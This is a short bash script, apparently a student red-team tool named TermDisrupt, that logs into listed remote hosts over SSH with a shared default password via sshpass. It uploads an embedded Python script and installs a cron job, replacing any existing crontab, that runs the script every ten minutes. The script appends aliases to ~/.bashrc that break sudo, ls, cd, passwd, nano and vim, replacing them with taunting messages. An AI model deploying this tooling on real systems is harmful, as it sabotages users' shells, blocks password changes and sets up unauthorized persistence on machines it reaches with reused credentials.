#!/bin/bash
# Hassan Alshehri
# ha1215@rit.edu
# TermDisrupt Deployment
# Dependencies: ssh and sshpass

# List of usernames to iterate over
usernames="remote_username"  # replace with the remote username

# List of ip's to iterate over
ips="remote_ip"  # replace with the remote IP

# Default password for SSH connection
defaultPass="ssh_password"  # replace with the ssh password

# TermDisrupt.py script content
read -r -d '' script_content <<'EOF'
#!/usr/bin/env python3

# TermDisrupt.py
# Author: [Your Name]
# Email: [Your Email]

import argparse
import os
import random
import time

COMMAND_MAPPINGS = {
    "sudo": ['echo "Did you mean to do that?"', 'echo "Try again later!"'],
    "ls": ['echo "You can\'t list that!"', 'echo "Files are hidden."'],
    "cd": ['echo "Where do you think you\'re going?"', 'echo "Stay where you are!"'],
    "passwd": ['echo "Changing password is not allowed!"', 'echo "Access Denied!"'],
    "nano": ['echo "No editing for you!"', 'echo "Editor is locked!"'],
    "vim": ['echo "Editing is forbidden!"', 'echo "VIM has vanished!"']
}

def disrupt_commands():
    config_file = "~/.bashrc" # targeting bashrc for this example
   
    for command, responses in COMMAND_MAPPINGS.items():
        chosen_response = random.choice(responses)
        os.system(f'echo "alias {command}=\'{chosen_response}\'" >> {config_file}')

    # Refresh the user's bash profile
    os.system(f'source {config_file}')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='TermDisrupt - Terminal Command Disruption Tool')
    parser.add_argument('--activate', action='store_true', help='Activate terminal command disruption')
    args = parser.parse_args()
    if args.activate:
        disrupt_commands()
EOF

# Loops through IPs
for hostTarget in ${ips} ; do
    # Loops through users
    for userTarget in ${usernames} ; do
        # Uploads TermDisrupt.py to remote host
        echo "${script_content}" | sshpass -p "${defaultPass}" ssh ${userTarget}@${hostTarget} 'cat > /tmp/TermDisrupt.py && chmod +x /tmp/TermDisrupt.py'
       
        # Sets up a cron job to execute TermDisrupt.py every 10 minutes
        cron_setup="echo '*/10 * * * * python3 /tmp/TermDisrupt.py --activate' | crontab -"
        sshpass -p "${defaultPass}" ssh ${userTarget}@${hostTarget} "${cron_setup}"
    done
done
echo "Done"
